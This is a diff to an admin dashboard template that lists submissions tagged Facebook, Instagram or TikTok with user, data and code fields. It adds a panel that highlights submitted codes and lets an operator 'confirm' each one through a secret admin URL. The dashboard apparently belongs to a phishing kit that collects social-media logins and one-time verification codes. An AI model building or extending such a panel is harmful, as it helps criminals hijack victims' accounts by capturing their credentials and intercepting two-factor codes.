@@ -232,6 +232,30 @@
       font-weight: 500;
     }
 
+    /* Confirmation Stats */
+    .confirmation-stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .confirmation-stat {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      text-align: center;
+    }
+
+    .confirmation-stat.pending {
+      border-top: 4px solid var(--warning);
+    }
+
+    .confirmation-stat.confirmed {
+      border-top: 4px solid var(--success);
+    }
+
     /* Main Card */
     .main-card {
       background: white;
@@ -374,6 +398,56 @@
       margin-left: 8px;
     }
 
+    /* Confirmation Circle */
+    .confirmation-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid var(--warning);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      background: white;
+    }
+
+    .confirmation-circle.confirmed {
+      background: var(--success);
+      border-color: var(--success);
+    }
+
+    .confirmation-circle.confirmed i {
+      color: white;
+    }
+
+    .confirmation-circle:hover:not(.confirmed) {
+      background: var(--warning);
+      border-color: var(--warning);
+    }
+
+    .confirmation-circle:hover:not(.confirmed) i {
+      color: white;
+    }
+
+    .confirmation-circle i {
+      color: var(--warning);
+      font-size: 14px;
+    }
+
+    .confirmation-circle.confirmed i {
+      color: white;
+    }
+
+    .code-highlight {
+      background: #fff3cd;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-weight: 600;
+      color: #856404;
+      border: 1px solid #ffeaa7;
+    }
+
     /* Pagination */
     .pagination {
       display: flex;
@@ -500,6 +574,22 @@
 
       <!-- Content Area -->
       <div class="content-area">
+        <!-- Confirmation Stats -->
+        <div class="confirmation-stats">
+          <div class="confirmation-stat pending">
+            <div class="stat-value">{{ submissions|selectattr('code_value')|list|length }}</div>
+            <div class="stat-label">Code Submissions</div>
+          </div>
+          <div class="confirmation-stat confirmed">
+            <div class="stat-value">{{ submissions|selectattr('confirmed')|selectattr('code_value')|list|length }}</div>
+            <div class="stat-label">Confirmed Codes</div>
+          </div>
+          <div class="confirmation-stat pending">
+            <div class="stat-value">{{ submissions|selectattr('code_value')|rejectattr('confirmed')|list|length }}</div>
+            <div class="stat-label">Pending Confirmation</div>
+          </div>
+        </div>
+
         <!-- Stats Overview -->
         <div class="stats-grid">
           <div class="stat-card">
@@ -513,21 +603,21 @@
             <div class="stat-icon">
               <i class="fa-solid fa-check-circle"></i>
             </div>
-            <div class="stat-value">{{ submissions|selectattr('page', 'equalto', 'Facebook')|list|length }}</div>
+            <div class="stat-value">{{ submissions|selectattr('platform_name', 'equalto', 'Facebook')|list|length }}</div>
             <div class="stat-label">Facebook Entries</div>
           </div>
           <div class="stat-card warning">
             <div class="stat-icon">
               <i class="fa-solid fa-clock"></i>
             </div>
-            <div class="stat-value">{{ submissions|selectattr('page', 'equalto', 'Instagram')|list|length }}</div>
+            <div class="stat-value">{{ submissions|selectattr('platform_name', 'equalto', 'Instagram')|list|length }}</div>
             <div class="stat-label">Instagram Entries</div>
           </div>
           <div class="stat-card danger">
             <div class="stat-icon">
               <i class="fa-solid fa-exclamation-triangle"></i>
             </div>
-            <div class="stat-value">{{ submissions|selectattr('page', 'equalto', 'TikTok')|list|length }}</div>
+            <div class="stat-value">{{ submissions|selectattr('platform_name', 'equalto', 'TikTok')|list|length }}</div>
             <div class="stat-label">TikTok Entries</div>
           </div>
         </div>
@@ -552,17 +642,19 @@
                   <th>Platform</th>
                   <th>User</th>
                   <th>Data</th>
+                  <th>Code</th>
+                  <th>Confirm</th>
                 </tr>
               </thead>
               <tbody>
-                {% for id, timestamp, page, user, data, icon in submissions %}
+                {% for id, timestamp, page, user, data, icon, code_value, confirmed, platform_name in submissions %}
                 <tr>
                   <td><strong>#{{ id }}</strong></td>
                   <td>{{ timestamp }}</td>
                   <td>
                     <span class="page-badge">
                       <i class="{{ icon }}"></i>
-                      {{ page }}
+                      {{ platform_name or page }}
                     </span>
                   </td>
                   <td>
@@ -576,6 +668,24 @@
                     <button class="expand-btn" onclick="toggleExpand(this)">
                       <i class="fa-solid fa-expand"></i>
                     </button>
+                  </td>
+                  <td>
+                    {% if code_value %}
+                      <span class="code-highlight">{{ code_value }}</span>
+                    {% else %}
+                      <span style="color: var(--gray);">-</span>
+                    {% endif %}
+                  </td>
+                  <td>
+                    {% if code_value %}
+                      <div class="confirmation-circle {% if confirmed %}confirmed{% endif %}" 
+                           data-id="{{ id }}"
+                           onclick="confirmSubmission({{ id }})">
+                        <i class="fa-solid {% if confirmed %}fa-check{% else %}fa-clock{% endif %}"></i>
+                      </div>
+                    {% else %}
+                      <span style="color: var(--gray);">-</span>
+                    {% endif %}
                   </td>
                 </tr>
                 {% endfor %}
@@ -599,6 +709,55 @@
   </div>
 
   <script>
+    // Confirmation function
+    function confirmSubmission(submissionId) {
+      const circle = document.querySelector(`.confirmation-circle[data-id="${submissionId}"]`);
+      if (circle.classList.contains('confirmed')) return;
+
+      fetch(`/admin/{{ secret }}/confirm/${submissionId}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          circle.classList.add('confirmed');
+          circle.innerHTML = '<i class="fa-solid fa-check"></i>';
+          // Show confirmation message
+          showNotification('Submission confirmed successfully!', 'success');
+        }
+      })
+      .catch(error => {
+        console.error('Error confirming submission:', error);
+        showNotification('Error confirming submission', 'error');
+      });
+    }
+
+    // Notification function
+    function showNotification(message, type) {
+      const notification = document.createElement('div');
+      notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        padding: 12px 20px;
+        border-radius: 8px;
+        color: white;
+        font-weight: 600;
+        z-index: 1000;
+        background: ${type === 'success' ? '#10B981' : '#EF4444'};
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      `;
+      notification.textContent = message;
+      document.body.appendChild(notification);
+      
+      setTimeout(() => {
+        notification.remove();
+      }, 3000);
+    }
+
     // 🔍 Search filter
     document.getElementById('search').addEventListener('input', function () {
       let filter = this.value.toLowerCase();
